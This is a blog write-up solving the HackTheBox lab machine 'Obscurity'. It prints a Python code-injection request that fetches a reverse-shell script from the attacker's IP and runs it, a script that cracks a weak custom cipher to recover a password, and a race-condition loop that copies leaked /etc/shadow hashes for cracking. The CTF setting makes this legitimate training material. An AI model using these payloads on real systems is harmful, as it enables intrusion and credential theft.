---
layout: single
title: "Obscurity Write-Up: HackTheBox"
excerpt: "Obscurity was an absolutely awesome machine by clubby789 on HackTheBox. Rolling their own web server, encryption, and SSH application, it gave a couple of holes that I could squeeze through."
classes: wide
categories: [hackthebox]
date: 2020-05-09
tags: [hackthebox, reversing, python, penetration testing, write-ups]
header:
  teaser: \assets\images\htb\obscurity\banner-obscurity.png
  teaser_home_page: true
toc: false
---
![](\assets\images\htb\obscurity\banner-obscurity.png)
## TL;DR
Obscurity was a fantastic machine of medium difficulty by clubby789 at HackTheBox. Rolling a few custom Python scripts for a web service, encryption, and SSH, Obscurity gave a couple of holes that I could squeeze through. With only a couple of open ports, it led me straight to enumerating the web application on port 8080. Examining the text on the main page it (surprisingly) leaked the file name of the webserver and allowed us to view the file with some directory traversal. Looking at the python file, it called a dangerous python exec() function which allowed us to obtain RCE via code injection. After getting a shell on the machine, we decrypt the user Robert's Key and Password by reversing it with a script we create. These creds allow us SSH access as Robert, which gives us sudo permission to use an "unique" SSH script. With some simple bash magic, we can grab Root's password hash and crack it with John.

## Nmap Port Scan
Nmap reveals a couple of ports, SSH and a "BadHTTPServer" on port 8080. 

`nmap -sCV -Pn -n -p- -T4 -oN nmap/full-obscurity 10.10.10.168`
```bash
Nmap scan report for 10.10.10.168                         
                                                                                      
PORT     STATE  SERVICE    VERSION                                                                                   
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                       
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)            
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)                                                      
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)                                                    
80/tcp   closed http                                                                                                 
8080/tcp open   http-proxy BadHTTPServer                                                                             
| fingerprint-strings:                                                                                               
|   GetRequest, HTTPOptions:                                                                                         
|     HTTP/1.1 200 OK                                                                                                
|     Date: Mon, 27 Apr 2020 21:25:38                                                                                
|     Server: BadHTTPServer                                                                                          
|     Last-Modified: Mon, 27 Apr 2020 21:25:38                                                                       
|     Content-Length: 4171                                                                                           
|     Content-Type: text/html                                                                                        
|     Connection: Closed                                                                                             
|     <!DOCTYPE html>                                                                                                
|     <html lang="en">                                                                                               
|     <head>                                                                                                         
|     <meta charset="utf-8">                                                                                         
|     <title>0bscura</title>                                                                                         
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">                                                          
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                           
|     <meta name="keywords" content="">                                                                              
|     <meta name="description" content="">                                                                           
|     <!--                                                                                                           
|     Easy Profile Template                                                                                          
|     http://www.templatemo.com/tm-467-easy-profile                                                                  
|     <!-- stylesheet css -->                                                                                        
|     <link rel="stylesheet" href="css/bootstrap.min.css">                
|     <link rel="stylesheet" href="css/font-awesome.min.css">                                                        
|     <link rel="stylesheet" href="css/templatemo-blue.css"> 
|     </head>                                             
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->                                                                                     
|     <!--                                                                                                           
|     <div class="preloader">     
|_    <div class="sk-spinner sk-spinner-wordpress">                                                                  
|_http-server-header: BadHTTPServer        
|_http-title: 0bscura                                     
9000/tcp closed cslistener
[TRUNCATED]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel         
```

## Web Enumeration

Looking at the web application on port 8080, we see it serving an interesting page.
![](\assets\images\htb\obscurity\obscurity-web.png)

Scrolling down a bit and we find an interesting statement. They leave a message to the server devs, giving the source code file name to the webserver. Let's see if we can locate this file.
![](\assets\images\htb\obscurity\obscurity-webdev.png)

Doing a simple directory traversal through Burp Suite allowed us to grab the source code of the web server.
![](\assets\images\htb\obscurity\obscurity-webdev-traverse.png)

Examining the source code further, we see a dangerous exec() call on the url path. Let's exploit this.
![](\assets\images\htb\obscurity\obscurity-websource.png)

Setting up tcpdump to listen for icmp, I was able to get a ping back with the following subprocess call.
![](\assets\images\htb\obscurity\obscurity-websubprocess.png)

Ref: [Exploiting Python Code Injection in Web Applications](https://www.securitynewspaper.com/2016/11/12/exploiting-python-code-injection-web-applications/){:target="_blank"}

With this, I created a simple bash reverse shell script and used wget to upload it to /tmp on the machine. Then I used the vulnerable function once again to execute the script. This returned a shell as `www-data`. There is probably a more elegant way, but I didn't want to overcomplicate it.

`GET /'+%2b+subprocess.call(['wget','10.10.14.34/rev.sh','-O','tmp/rev.sh'])+%2b+' HTTP/1.1`  
`GET /'+%2b+subprocess.call(['bash','tmp/rev.sh'])+%2b+' HTTP/1.1`

One of the first things I noticed is that we can read Robert's home directory as `www-data` and he has quite a few interesting files.

```bash
ls -la /home/robert
total 60
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
drwxr-xr-x 3 root   root   4096 Sep 24  2019 ..
lrwxrwxrwx 1 robert robert    9 Sep 28  2019 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
drwx------ 2 robert robert 4096 Oct  3  2019 .cache
-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3  2019 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3  2019 .local
-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
```
What I found is that there is a script called `SuperSecureCrypt.py` that is used to "encrypt" a file with a "key". Robert left has a `passwordreminder.txt` file, and conveniently, a `check.out` and `out.txt` file. `out.txt` contains the encrypted output of `check.txt`. This will allow us to potentially reverse the encryption and get his key, which we can use to decrypt his password reminder file.

![](\assets\images\htb\obscurity\robert-files.png)

SuperSecureCrypt.py
```python
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
```

The following was what I came up with, which successfully reversed the encryption, output the key and password. Aptly named, `SuperDecryptor.py`. I included a few comments to describe what it is doing.
```python
import string

# Vars
k = '' # Holds the Key!
i = 0 # Looping
isCrack = False

# Files from Robert's Directory
checkFile = open('check.txt').read()
outFile = open('out.txt').read() 
passFile = open('passwordreminder.txt', 'r').read()

# Slightly Modified Decrypt Function From SuperSecureCrypt.py
def decrypt(text, key):
    keyPos = 0
    decrypted = ""
    for x in text:
        newChr = chr((ord(x) - ord(key[keyPos])) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % len(key)
    return decrypted

while not isCrack: # Keep looping until it's cracked
    for c in string.printable: # For each printable character
        decCompare = decrypt(outFile, k + c) # Decrypt each char concat'd with key string 
        if checkFile[i] == decCompare[i]: # If we have a match...
            k += c # Add the character to the key string 
            i += 1 # Increment index counter
            if checkFile.strip() == decCompare.strip(): # See if we're done
                print(f'[+] The Super Secret Key is: {k}')
                isCrack = True 

# Decrypt Robert's Password Reminder File with the key
print(f'[+] Robert\'s Decrypted Password: {decrypt(passFile, k).strip()}')
```

We have a password! Let's see if it works.
![](\assets\images\htb\obscurity\super-decryptor.png)

This allows us to log in with SSH as Robert and grab the user flag!
![](\assets\images\htb\obscurity\obscurity-user.png)

Within the BetterSSH directory in Robert's home folder, I saw a BetterSSH.py script owned by root. 

In addition, we can run it as root:
```bash
robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

BetterSSH.py
```python
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

This script is doing some stupidly dangerous things.
- It's opening and parsing /etc/shadow, if run as root (which I can do).
- Spliting on the colon, it copies every "user" hash, etc. to a file in the tmp directory.
- All I would have to do is snag a copy of the file before it's removed.

I open a second SSH session and run:
```bash
while true; do cp –r /tmp/SSH/* /dev/shm; done
```

In my other session, I run the script with sudo, and enter in Robert's creds:
![](\assets\images\htb\obscurity\better-ssh.png)

It successfully grabs the file and copies it to `/dev/shm` for me.
![](\assets\images\htb\obscurity\better-ssh-out.png)

I crack the hash with John.
![](\assets\images\htb\obscurity\root-crack.png)

We get the password `mercedes` and a quick `su` to root, we capture the root flag! Awesome box!
![](\assets\images\htb\obscurity\root-flag.png)

Thank you for reading. 
